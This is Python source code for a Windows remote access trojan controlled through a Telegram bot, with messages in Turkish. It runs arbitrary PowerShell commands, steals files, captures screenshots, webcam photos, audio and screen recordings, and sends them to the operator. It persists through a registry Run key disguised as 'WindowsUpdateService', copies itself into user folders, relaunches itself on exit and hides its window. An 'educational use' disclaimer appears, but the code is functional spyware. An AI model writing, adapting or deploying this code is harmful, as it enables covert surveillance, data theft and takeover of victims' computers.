import atexit
import getpass
import shutil
import traceback
import telebot
import subprocess
import os
import cv2
import ctypes
import numpy as np
import pyautogui
import pyaudio
import wave
import time
import winreg as reg

API_TOKEN = 'TELEGRAM-API'

bot = telebot.TeleBot(API_TOKEN)
startMessage = "Merhaba, C2 control botuna hoş geldiniz. Eğer hedef üzerinde dosya çalıştırılmışsa yazdığınız komutlara cevap alırsınız. \n \n 1- /start => bu mesajı gösterir \n 2- /dir => dizin bilgisini alır \n 3- /ip => ipconfig komutunu çalıştırır \n 4- /powershell {powershell komutu} => girdiğiniz powershell komutunu hedef sistem üzerinde çalıştırır \n 5- /getfile {path} => belirtilen yoldaki dosyayı alır \n 6- /screenshot => ekran görüntüsü alır \n 7- /message {mesaj içeriği} => hedefin ekranında mesaj kutucuğu çıkartır \n 8- /takephoto => bilgisayarın tüm kameralarına erişip hepsinden fotoğraf çeker. \n 9- /help => komutları gösterir. \n 10- /mouseplay {x y} => mouseu belirtilen x ve y koordinatlarına getirir. \n 11- /recaudio => seçtiğiniz saniye kadar ses kaydeder. \n 12- /recscreen => seçtiğiniz saniye kadar ekranı kaydeder. \n\n BİLGİLENDİRME \n\n Bu araç eğitim faaliyetleri için yapılmıştır. Kullanımı kişinin kendi sorumluluğundadır. Aracı kullanmaya devam ediyorsanız yapılan faaliyetlerden aracı kullanan kişinin sorumlu olduğunu kabul ettiğiniz varsayılır. \n \n "

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, startMessage)
    copy_to_c_drive("c2bot.pyw")
    add_to_startup('C:\\path\\to\\your\\file.py', message.chat.id)
    if (success == 1):
        bot.reply_to(message, "Dosya D:/ konumuna kopyalandı.")
    elif (success == 0):
        bot.reply_to(message, "Dosya kopyalanırken bir hata oluştu")
    time_message(message)

def add_to_startup(file_path, chat_id):
    try:
        key = reg.HKEY_CURRENT_USER
        key_value = r'Software\Microsoft\Windows\CurrentVersion\Run'
        open_key = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
        reg.SetValueEx(open_key, "WindowsUpdateService", 0, reg.REG_SZ, file_path)
        reg.CloseKey(open_key)
        bot.send_message(chat_id, f"{file_path} başarıyla başlangıç programlarına eklendi.")
    except Exception as e:
        bot.send_message(chat_id, f"Başlangıç programlarına eklenirken hata oluştu: {str(e)}")

# Kullanım örneği
# add_to_startup('C:\\path\\to\\your\\file.py', message.chat.id)

def time_message(message):
      while True:
        bot.reply_to(message,"Kurban ile bağlantı devam ediyor..")
        time.sleep(1800)
@bot.message_handler(commands=['sendmessage'])
def alert(message):
    try:
        SendedMessage = message.text.split(' ', 1)[1]
        bot.reply_to(message, "Mesaj gönderildi...")
        pyautogui.alert(SendedMessage)
    except Exception as e:
        bot.reply_to(message, f"Hata: {str(e)}")
        
@bot.message_handler(commands=['screenshot'])
def scrshot(message):
    try:
        size = pyautogui.size()
        position = pyautogui.position()
        screenShot = pyautogui.screenshot()
        screenShot.save('screenshot.png')
        file_path = 'screenshot.png'
        if os.path.exists(file_path):
             with open(file_path, 'rb') as file:
                bot.send_photo(message.chat.id, file)
                bot.reply_to(message, "Ekran boyutu: " + str(size) + "\n Farenin konumu: " + str(position))
             os.remove('screenshot.png')
                
        else:
            bot.reply_to(message, "Belirtilen dosya bulunamadı.")
    except Exception as e:
        bot.reply_to(message, f"Hata: {str(e)}")

@bot.message_handler(commands=['help'])
def help(message):
    bot.reply_to(message, startMessage)

@bot.message_handler(commands=['getfile'])
def send_file(message):
    try:
        file_path = message.text.split(' ', 1)[1]
        if os.path.exists(file_path):
            with open(file_path, 'rb') as file:
                bot.send_document(message.chat.id, file)
        else:
            bot.reply_to(message, "Belirtilen dosya bulunamadı.")
    except Exception as e:
        bot.reply_to(message, f"Hata: {str(e)}")


def record_screen(seconds):

    screen_size = pyautogui.size()
    width, height = screen_size

    fourcc = cv2.VideoWriter_fourcc(*"XVID")
    out = cv2.VideoWriter("output.avi", fourcc, 20.0, (width, height))


    for _ in range(seconds * 20):  
        frame = pyautogui.screenshot()
        frame = np.array(frame)
        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        out.write(frame)

    out.release()

    return "output.avi"


@bot.message_handler(commands=['recscreen'])
def handle_record_screen(message):
    try:
        bot.reply_to(message, "Ekran kaydı başlıyor. Lütfen kaydetmek istediğiniz süreyi saniye cinsinden belirtin. (max 5 saniye)")

        @bot.message_handler(func=lambda m: True)
        def handle_screen_duration(message):
            try:
                seconds = int(message.text)
                if seconds <= 0:
                    raise ValueError("Geçersiz süre.")

                bot.reply_to(message, f"{seconds} saniye boyunca ekran kaydedilecek. Lütfen bekleyin...")
                video_path = record_screen(seconds)
                with open(video_path, "rb") as video_file:
                    bot.send_video(message.chat.id, video_file)

            except ValueError:
                bot.reply_to(message, "Geçersiz süre. Lütfen pozitif bir tamsayı girin.")

    except Exception as e:
        bot.reply_to(message, f"Hata: {str(e)}")

@bot.message_handler(commands=['mouseplay'])
def mouse_plaey(message):
    try:
        pos_split = message.text.split(' ')
        posX = int(pos_split[1])
        posY = int(pos_split[2])
        pyautogui.moveTo(posX, posY)
        bot.reply_to(message, f"X pozisyonu = {posX} \nY pozisyonu = {posY} \nMouse başarıyla hedef koordinata oynatıldı")
    except Exception as e:
        bot.reply_to(message, f"Hata oluştu: {str(e)}")

def record_audio(seconds, message):
    FORMAT = pyaudio.paInt16 
    CHANNELS = 1 
    RATE = 44100
    CHUNK = 1024 
    audio = pyaudio.PyAudio()
    stream = audio.open(format=FORMAT,
                        channels=CHANNELS,
                        rate=RATE,
                        input=True,
                        frames_per_buffer=CHUNK)

    bot.reply_to(message, f"{seconds} saniyelik kayıt başlıyor...")
    frames = []
    for i in range(0, int(RATE / CHUNK * seconds)):
        data = stream.read(CHUNK)
        frames.append(data)

    bot.reply_to(message, f"{seconds} saniyelik kayıt tamamlandı.")
    stream.stop_stream()
    stream.close()
    audio.terminate()

    return frames

@bot.message_handler(commands=['recaudio'])
def handle_record_audio(message):
    try:
        bot.reply_to(message, "Ses kaydı başlıyor. Lütfen kaydetmek istediğiniz süreyi saniye cinsinden belirtin.")
        @bot.message_handler(func=lambda m: True)
        def handle_audio_duration(message):
            try:
                seconds = int(message.text)
                if seconds <= 0:
                    raise ValueError("Geçersiz süre.")

                bot.reply_to(message, f"{seconds} saniye boyunca ses kaydedilecek. Lütfen bekleyin...")
                frames = record_audio(seconds, message)
                with wave.open("output.wav", 'wb') as wf:
                    wf.setnchannels(1)
                    wf.setsampwidth(pyaudio.PyAudio().get_sample_size(pyaudio.paInt16))
                    wf.setframerate(44100)
                    wf.writeframes(b''.join(frames))

                with open("output.wav", "rb") as audio_file:
                    bot.send_audio(message.chat.id, audio_file)

            except ValueError:
                bot.reply_to(message, "Geçersiz süre. Lütfen pozitif bir tamsayı girin.")

    except Exception as e:
        bot.reply_to(message, f"Hata: {str(e)}")

@bot.message_handler(commands=['ip'])
def send_ip(message):
    try:
        ip_address_bytes = subprocess.check_output(['ipconfig'], universal_newlines=True, encoding='cp437')
        ip_address = ip_address_bytes
        bot.reply_to(message, f"{ip_address}")
    except Exception as e:
        bot.reply_to(message, f"IP adresi alınamadı: {str(e)}")

@bot.message_handler(commands=['powershell'])
def run_powershell_command(message):
    try:
        command = message.text.split(' ', 1)[1]
        output = subprocess.check_output(['powershell', command], universal_newlines=True, shell=True, encoding='cp437')
        bot.reply_to(message, f"PowerShell çıktısı:\n{output}")
    except Exception as e:
        bot.reply_to(message, f"Hata: {str(e)}")

@bot.message_handler(commands=['takephoto'])
def take_photo(message):
    try:
        cameras = []
        for i in range(4):
            cap = cv2.VideoCapture(i)
            if cap.isOpened():
                cameras.append(cap)
            else:
                break
        for cap in cameras:
            ret, frame = cap.read()
            if ret:
                cv2.imwrite(f"temp_photo_{cameras.index(cap)}.jpg", frame)
                with open(f"temp_photo_{cameras.index(cap)}.jpg", "rb") as photo:
                    bot.send_photo(message.chat.id, photo)
                os.remove(f"temp_photo_{cameras.index(cap)}.jpg")
        for cap in cameras:
            cap.release()

    except Exception as e:
        bot.reply_to(message, f"Hata: {str(e)}")
@bot.message_handler(commands=['dir'])
def send_dir(message):
    try:
        dir_command = 'C:\\Windows\\System32\\cmd.exe /c dir'
        directory_listing = subprocess.check_output(dir_command, universal_newlines=True, shell=True, encoding='cp437')
        bot.reply_to(message, f"{directory_listing}")
    except Exception as e:
        bot.reply_to(message, f"Dizin bilgisi alınamadı: {str(e)}")

def copy_to_multiple_locations(source):
    try:
        username = getpass.getuser()
        target_directories = [
            f"C:\\Users\\{username}\\Downloads",
            f"C:\\Users\\{username}",
            f"C:\\Users\\{username}\\Documents",
            f"C:\\Users\\{username}\\Pictures"
        ]
        copied_file_paths = []

        for directory in target_directories:
            destination = os.path.join(directory, "c2bot_copy.pyw")
            shutil.copyfile(source, destination)
            copied_file_paths.append(destination)
            print(f"Dosya {directory} konumuna kopyalandı.")

        return copied_file_paths

    except Exception as e:
        print(f"Hata: {str(e)}")
        return None
    
def open_copied_file(file_paths):
    try:
        for file_path in file_paths:
            if os.path.exists(file_path):
                os.startfile(file_path)
                print(f"Dosya başarıyla açıldı: {file_path}")
                break
        else:
            print("Hiçbir kopya bulunamadı.")

    except Exception as e:
        print(f"Dosya açılırken bir hata oluştu: {str(e)}")

def copy_to_c_drive(source):
    try:
        file_name = "WindowsUpdateService.pyw"
        username = getpass.getuser()
        global success
        destination = os.path.join(f'C:\\Users\\{username}\\Desktop', file_name)
        shutil.copyfile(source, destination)
        success = 1
        print("Dosya başarıyla kopyalandı.")
        return destination
    except Exception as e:
        print(f"Hata: {str(e)}")
        success = 0
        return None
def on_bot_shutdown(source):
    try:
        copied_file_paths = copy_to_multiple_locations(source)
        open_copied_file(copied_file_paths)
    except Exception as e:
        print(f"Bot kapatılırken bir hata oluştu: {str(e)}")
        traceback.print_exc()

def run_bot():
    while True:
        try:
            bot.polling(none_stop=True)
            kernel32 = ctypes.WinDLL('kernel32')
            user32 = ctypes.WinDLL('user32')
            SW_HIDE = 0
            hWnd = kernel32.GetConsoleWindow()
            user32.ShowWindow(hWnd, SW_HIDE)
        except Exception as e:
            print(f"Bot çalıştırılırken bir hata oluştu: {str(e)}")
            traceback.print_exc()
            continue

if __name__ == "__main__":
    source_file = "c2bot.pyw"
    atexit.register(on_bot_shutdown, source_file)
    run_bot()

    
